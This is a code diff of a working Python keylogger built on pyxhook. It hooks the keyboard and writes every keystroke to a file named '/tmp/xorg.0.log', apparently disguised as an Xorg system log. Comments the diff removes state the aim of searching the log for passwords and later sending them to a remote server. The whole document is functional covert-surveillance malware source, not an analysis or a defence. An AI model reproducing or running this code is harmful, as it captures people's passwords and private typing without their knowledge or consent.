@@ -1,42 +1,40 @@
 import pyxhook
-# Global variables
 
-
-
-
-#Path to save file
-log_file='/tmp/xorg.0.log'
-#passWordFile='/tmp/xorg.1.log'
-
-
-#this function is called everytime a key is pressed.
+# this function is called everytime a key is pressed.
 def OnKeyPress(event):
 
-  fileOpen=open(log_file,'a')
+    # Path to save file
+    log_file = '/tmp/xorg.0.log'
 
-  fileOpen.write(event.Key)
-  # for every 20 Characters written, write a new line
-  #fileOpen.write(( ' '.join(textwrap.wrap(event.Key, 20))))
+    # passWordFile='/tmp/xorg.1.log'
 
-  if event.Ascii==32 or event.Ascii==46 or event.Ascii==13:
+    fileOpen = open(log_file, 'a')
 
-      # instead of writting out an actual space,
-      # use this to find the word "space" and remove it from the file
-      # if a user types space, then the word will be known as an error
-      fileOpen.write('\n')
+    fileOpen.write(event.Key)
+    # for every 20 Characters written, write a new line
+    #fileOpen.write(( ' '.join(textwrap.wrap(event.Key, 20))))
 
-  if event.Ascii==96:
+    if event.Ascii == 32:
 
-	# if the (`) grave key is pressed. exit
-	fileOpen.close()
-	new_hook.cancel()
+        # instead of writting out an actual space,
+        # use this to find the word "space" and remove it from the file
+        # if a user types space, then the word will be known as an error
+        fileOpen.write('\n')
 
+    if event.Ascii == 96:
 
+        # if the (`) grave key is pressed. exit
+        fileOpen.close()
+        new_hook.cancel()
 
+new_hook = pyxhook.HookManager()
 
-#Format Text After the keyloggin sessions ends
-#search for password and pipe it
-# This will be the base of sending the password remotely to a server
+# Inhert Keylogging logic from pyxhook
+# & logLogic implemnts the OnKey pressed
+new_hook.KeyDown = OnKeyPress
 
-sFile = open("/tmp/xorg.0.log","r")
-search = sFile.readlines()
+# Hook the keyboard
+new_hook.HookKeyboard()
+
+# start the session
+new_hook.start()
